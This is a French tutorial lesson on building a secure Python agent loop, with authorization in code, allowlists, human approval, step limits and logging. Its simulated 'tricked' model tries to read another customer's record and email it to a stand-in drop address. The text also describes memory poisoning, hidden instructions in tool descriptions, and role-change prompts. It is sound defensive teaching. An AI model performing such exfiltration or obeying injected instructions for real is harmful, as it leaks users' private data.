---
title: Construire un agent en sécurité
summary: Écrire une boucle d'agent fonctionnelle en Python, avec l'autorisation hors du modèle, des validations humaines, des limites et des journaux, puis ajouter la récupération et MCP sans perdre le contrôle.
builds: un petit agent qui utilise des outils, dont les règles survivent à un modèle trompé
source: OWASP Top 10 for Agentic Applications (en anglais) | https://genai.owasp.org/resource/owasp-top-10-for-agentic-applications-for-2026/
words: boucle d'agent, outil au moindre privilège, validation humaine
---
Les gens de la sécurité qui savent construire sont bien plus utiles que ceux qui se contentent de critiquer. Ici, vous allez écrire une vraie boucle d'agent. Elle est courte, elle fonctionne, et elle est conçue autour d'une hypothèse : **le modèle finira par faire ce que veut un attaquant.** La question est de savoir ce qui se passe alors.

@term boucle d'agent = Le cycle qui consiste à demander à un modèle quoi faire, exécuter l'action, et lui donner le résultat.
@term outil au moindre privilège = Un outil qui ne peut faire que la tâche étroite dont un agent a besoin.
@term validation humaine = Une pause où une personne doit confirmer une action avant qu'elle n'ait lieu.
@term empoisonnement de la mémoire = Planter du texte dans la mémoire d'un agent pour qu'il se comporte mal lors de sessions ultérieures.
@term description d'outil = Le texte qui dit à un modèle ce que fait un outil, et qui est lui-même lu comme une entrée.

## La boucle

Un agent est plus petit qu'on ne le croit. Le voici en entier, avec la seule bibliothèque standard. `fake_model` remplace n'importe quel vrai modèle, pour que vous puissiez l'exécuter sans compte, et il joue exprès un modèle trompé.

@seq Utilisateur | Appli | Modèle | Outil
Utilisateur > Appli: Une question
Appli > Modèle: Question + liste des outils
Modèle > Appli: Appelle cet outil, s'il te plaît
Appli > Outil: Seulement si l'utilisateur en a le droit
Outil > Appli: Un résultat, traité comme une donnée
Appli > Modèle: Le résultat
Modèle > Appli: Une réponse
Appli > Utilisateur: La réponse

```python
import json

CUSTOMERS = {
    "C-1": {"owner": "sara", "email": "sara@oasis.example"},
    "C-2": {"owner": "omar", "email": "omar@oasis.example"},
}
ALLOWED_DOMAINS = {"oasis.example"}
MAX_STEPS = 5

def lookup_customer(user, customer_id):
    record = CUSTOMERS.get(customer_id)
    if record is None or record["owner"] != user:   # l'autorisation, dans le code
        return {"error": "not allowed"}
    return record

def send_email(user, to, body):
    if to.split("@")[-1] not in ALLOWED_DOMAINS:    # liste blanche des sorties
        return {"error": "destination refused"}
    return {"needs_approval": True, "to": to}       # un humain confirme

TOOLS = {"lookup_customer": lookup_customer, "send_email": send_email}

def fake_model(messages):
    """Remplacez ceci par l'appel d'un vrai modèle. Il agit comme s'il avait été trompé."""
    calls = [m for m in messages if m["role"] == "tool"]
    if not calls:
        return {"tool": "lookup_customer", "args": {"customer_id": "C-2"}}
    if len(calls) == 1:
        return {"tool": "send_email",
                "args": {"to": "drop@files-archive.example", "body": "records"}}
    return {"answer": "Done."}

def run_agent(user, question):
    messages = [{"role": "system", "content": "You help with support tickets."},
                {"role": "user", "content": question}]
    for _ in range(MAX_STEPS):                      # une boucle bornée
        reply = fake_model(messages)
        if "answer" in reply:
            return reply["answer"]
        name = reply["tool"]
        if name not in TOOLS:                       # pas d'outil inventé
            result = {"error": "unknown tool"}
        else:
            result = TOOLS[name](user, **reply["args"])
        print(json.dumps({"user": user, "tool": name,   # journaliser chaque appel
                          "args": reply["args"], "result": result}))
        messages.append({"role": "tool", "content": json.dumps(result)})
    return "Stopped: too many steps."

print(run_agent("sara", "Summarise ticket 103"))
```

Enregistrez-le sous `agent.py` et lancez-le avec `python3 agent.py`. Voici ce qui s'affiche :

```
{"user": "sara", "tool": "lookup_customer", "args": {"customer_id": "C-2"}, "result": {"error": "not allowed"}}
{"user": "sara", "tool": "send_email", "args": {"to": "drop@files-archive.example", "body": "records"}, "result": {"error": "destination refused"}}
Done.
```

Le modèle a essayé de voler le dossier d'Omar et de l'envoyer à l'extérieur. Les deux tentatives ont échoué, et rien dans ce code ne dépend de l'honnêteté du modèle.

?? Dans ce code, qu'est-ce qui empêche la session de Sara de lire le dossier d'Omar ?
+ La vérification du propriétaire, dans le code de l'outil
- Une consigne polie placée là dans le prompt système
- Le faux modèle, qui se comporte toujours très correctement
- Le format JSON de tous les appels d'outils journalisés
=> La vérification s'exécute dans votre code, avec le vrai utilisateur, et le modèle ne peut pas la contourner par la parole.

## Cinq règles dans ce code

| Règle | Où | Empêche |
|---|---|---|
| L'outil reçoit le vrai utilisateur de votre code, pas du modèle | `TOOLS[name](user, ...)` | Un modèle qui prétend être quelqu'un d'autre |
| Vérifier les permissions dans chaque outil | `record["owner"] != user` | La lecture des données d'autrui |
| Limiter les destinations | `ALLOWED_DOMAINS` | L'envoi de données à l'extérieur |
| Borner la boucle | `MAX_STEPS` | Les coûts et les boucles qui s'emballent |
| Journaliser chaque appel | `print(json.dumps(...))` | Un mauvais usage silencieux, et cela vous donne des preuves |

Remarquez que `user` est fourni par votre programme. Si le modèle pouvait le fournir, il pourrait mentir. L'identité doit toujours venir de votre session, jamais de la sortie du modèle.

Il reste un trou dans cette boucle : `TOOLS[name](user, **reply["args"])` transmet tous les arguments que le modèle a écrits. Un modèle peut inventer un champ, en oublier un, ou envoyer une liste là où votre code attend du texte, et Python plantera ou, pire, l'acceptera. Vérifiez d'abord chaque appel par rapport à un petit schéma : les champs qui doivent être là, leurs types, et rien d'autre.

@code tool-args

@drill ai-control

?? Pourquoi l'identité de l'utilisateur ne doit-elle pas venir de la sortie du modèle ?
+ Un modèle trompé pourrait tout simplement prétendre n'importe quoi
- Les modèles n'arrivent à épeler correctement aucun nom d'utilisateur
- Le champ d'identité rend les tokens bien plus chers
- Le JSON ne sait représenter correctement aucun nom d'utilisateur
=> Tout ce qu'écrit le modèle peut être contrôlé par un attaquant. Les faits de confiance doivent venir de votre propre session.

## Concevoir les outils

Faites des outils petits et précis. Un mauvais outil, c'est `run_sql(query)`, et un bon, `get_order_status(order_id)`. Le premier peut tout faire, donc vous avez remis votre base de données à un prédicteur de texte.

| Au lieu de | Préférez |
|---|---|
| `run_shell(command)` | `restart_service(name)`, à partir d'une liste fixe |
| `send_email(to, body)` | `reply_to_ticket(ticket_id, body)` |
| `read_file(path)` | `get_policy(name)` |

Séparez la lecture de l'action. Gardez des **validations humaines** pour tout ce qui est difficile à annuler : paiements, suppressions, messages vers l'extérieur. Montrez à la personne l'action réelle, pas la description qu'en donne le modèle, puisque ce résumé pourrait lui aussi être un mensonge.

Quelles actions demandent une personne ? Écrivez la règle sous forme de code, pour qu'elle ne dépende du jugement de personne sur le moment, et certainement pas de celui du modèle :

| Action | Validation |
|---|---|
| Lire quelque chose que l'utilisateur peut voir | Jamais |
| Une réponse à l'intérieur du domaine de l'entreprise | Jamais |
| Un courriel vers une adresse extérieure | Toujours |
| Un remboursement au-dessus d'un montant fixé | Toujours |
| Tout ce qui supprime | Toujours |

@code approval-rules

?? Un agent a besoin de l'état des commandes. Quelle conception d'outil est la plus sûre ?
+ `get_order(id)`, vérifié par rapport à l'utilisateur qui est connecté
- `run_sql(query)`, accompagné d'un simple avertissement placé dans le prompt
- `read_table(name)`, qui couvre toutes les tables de la base
- `http_get(url)`, qui peut atteindre n'importe quelle adresse web interne
=> Des outils étroits limitent ce que peut faire un modèle trompé. Le risque se trouve dans ce que l'outil permet.

## Arrêter une boucle

`MAX_STEPS` arrête une boucle qui dure trop longtemps. Deux autres limites valent la peine d'être ajoutées. Un **budget de tokens** empêche une seule conversation coûteuse de faire grimper la facture, et un **contrôle des répétitions** arrête un modèle qui redemande sans cesse le même appel en échec, une façon courante pour un agent de se bloquer. Chaque arrêt doit dire pourquoi il a eu lieu, car « arrêté » tout seul n'apprend rien à la personne qui lit les journaux.

@code loop-guard

?? Un agent appelle trois fois de suite le même outil avec les mêmes arguments. Que doit faire la boucle ?
+ S'arrêter, et journaliser qu'il se répétait en boucle
- Continuer jusqu'à ce que cela finisse par marcher
- Recommencer la conversation depuis la toute première étape
- Demander au modèle de s'excuser auprès de l'utilisateur
=> Le même appel donne le même résultat, donc un quatrième essai n'aidera pas. S'arrêter avec une raison économise de l'argent et désigne tout de suite le problème.

## Ajouter la récupération

Le RAG ajoute un nouveau chemin pour les attaquants, donc appliquez-y aussi vos règles.

- **Filtrez par permission au moment de la récupération**, dans votre code, avec le vrai utilisateur.
- **Marquez clairement le texte récupéré comme des données**, en sachant que cela aide sans rien garantir.
- **Notez d'où vient chaque morceau**, pour pouvoir enquêter. C'est le champ `source_doc` que vous avez utilisé dans les missions.
- **Surveillez ce qui est indexé.** Qui peut ajouter un document peut ajouter des instructions.

La mémoire à long terme mérite la même méfiance. L'**empoisonnement de la mémoire** signifie qu'un mauvais message aujourd'hui peut discrètement orienter le comportement la semaine prochaine. Stockez ce qui est nécessaire, montrez aux utilisateurs ce qui est stocké, et laissez-les l'effacer.

Les mêmes règles valent pour la mémoire que pour la récupération : chaque utilisateur ne voit que la sienne, tout expire, et chaque entrée note d'où elle vient.

@code memory-recall

?? Où le filtrage par permission doit-il se faire dans un système RAG ?
+ Dans votre code, avant que les documents n'atteignent le modèle
- Dans le prompt, en lui demandant de respecter les accès
- Dans le navigateur de l'utilisateur, après l'arrivée de la réponse
- Nulle part, puisque tous les embeddings sont déjà entièrement anonymes
=> Une fois le texte dans le prompt, le modèle peut le révéler. Filtrez d'abord, pour qu'il ne voie jamais ce que l'utilisateur ne pourrait pas voir.

## Connecter des outils avec MCP

Le [Model Context Protocol](https://modelcontextprotocol.io/) permet à une application d'IA de se connecter à des outils à travers un standard. C'est pratique, et cela élargit votre chaîne d'approvisionnement.

| Risque | Mesure |
|---|---|
| La description d'un outil contient des instructions cachées | Traiter les descriptions comme non fiables, et les relire |
| Un serveur change après que vous l'avez approuvé | Épingler les versions, et relire les mises à jour |
| Un serveur détient des jetons larges | Donner à chacun ses propres identifiants étroits |
| De nombreux outils se combinent en triade | Évaluer l'ensemble, pas chaque outil séparément |

Installer un serveur MCP, c'est faire confiance à du code. Contrôlez-le comme vous contrôleriez une dépendance.

?? Pourquoi relire le texte de description d'un outil tiers ?
+ Le modèle la lit, donc elle peut l'orienter
- Une longue description ralentit beaucoup trop l'outil appelé
- Les descriptions s'affichent aux clients du site web
- Elle doit être rédigée en anglais juridique formel
=> La description d'un outil entre dans le contexte, donc une description malveillante peut orienter le modèle. C'est une entrée comme une autre.

## Brancher un vrai modèle

Pour mettre un vrai modèle à la place, remplacez `fake_model` par un appel à l'API de votre fournisseur, en traduisant son format d'appel d'outil en `{"tool": ..., "args": ...}`. Rien d'autre dans la boucle n'a besoin de changer, et les règles de sécurité restent exactement où elles sont. C'est le signe d'une bonne conception : le modèle est une pièce remplaçable, et les mesures ne sont pas à l'intérieur.

::: try Commencez P15
Faites-en un assistant de support avec un outil de consultation et un outil d'action, puis placez-le dans un conteneur que vous pouvez réinitialiser. Voyez le [projet P15](/projects/P15/). Dans la prochaine leçon, vous attaquerez votre propre création.
:::

?? Vous remplacez `fake_model` par le modèle d'un vrai fournisseur. Quelle partie de la boucle doit changer ?
+ Seulement l'appel qui traduit le format de réponse du modèle
- Chaque outil, car un vrai modèle exige de nouvelles permissions
- La liste blanche, un vrai modèle envoie plus de courriels
- La journalisation, car un vrai modèle tient ses propres journaux
=> Les mesures vivent dans votre code, autour du modèle, donc elles ne bougent pas. Seul l'adaptateur entre le format du fournisseur et `{"tool": ..., "args": ...}` est nouveau.

## Relire un agent

La conception d'agent d'un collègue contient trois lignes à questionner.

```
Outils :   run_sql(query), send_email(to, body)
Identité : le modèle passe « user » en argument à chaque outil
Limites :  aucune, le modèle décide quand il a fini
```

?? Qu'est-ce qui ne va pas avec `run_sql(query)` ?
+ Il permet à un modèle trompé de tout faire
- Le SQL est trop lent pour n'importe quel agent
- Les modèles ne savent pas du tout écrire SQL
- Il devrait plutôt porter tout simplement le nom database
=> Un outil qui accepte n'importe quelle requête remet toute la base à celui qui contrôle le texte du modèle. Remplacez-le par des outils étroits comme `get_order_status(order_id)`.

?? Pourquoi retirer « user » des arguments du modèle ?
+ Le modèle pourrait y nommer n'importe quel utilisateur
- Les noms d'utilisateur rallongent beaucoup trop le prompt
- Aucun outil n'a le droit de connaître l'utilisateur
- Il est plus rapide de chercher l'utilisateur ailleurs
=> L'identité doit venir de la session connectée, dans votre code. Un modèle à qui l'on dit « agis en administrateur » écrira volontiers `"user": "admin"`.

?? Que pourrait-il se passer sans aucune limite ?
+ Il tourne en boucle sans fin, et les coûts grimpent
- Il termine désormais chacune de ses tâches beaucoup plus vite
- Le modèle apprend à s'arrêter de lui-même, avec le temps
- Rien, car les modèles savent toujours quand ils doivent s'arrêter
=> Un modèle confus ou manipulé peut répéter des appels indéfiniment. Une limite d'étapes, un budget de tokens et un contrôle des répétitions l'arrêtent chacun, en disant pourquoi.

?! Choisissez une action de votre propre vie, comme payer une facture. Si un agent la faisait, quelles règles de cette leçon exigeriez-vous, et pourquoi ?

### Pour aller plus loin

Les sources primaires et le meilleur matériel gratuit sur ce sujet, tous vérifiés en novembre 2026 (en anglais) :

- [Anthropic, Building effective agents](https://www.anthropic.com/engineering/building-effective-agents)
- [OWASP Top 10 for LLM Applications](https://genai.owasp.org/llm-top-10/)
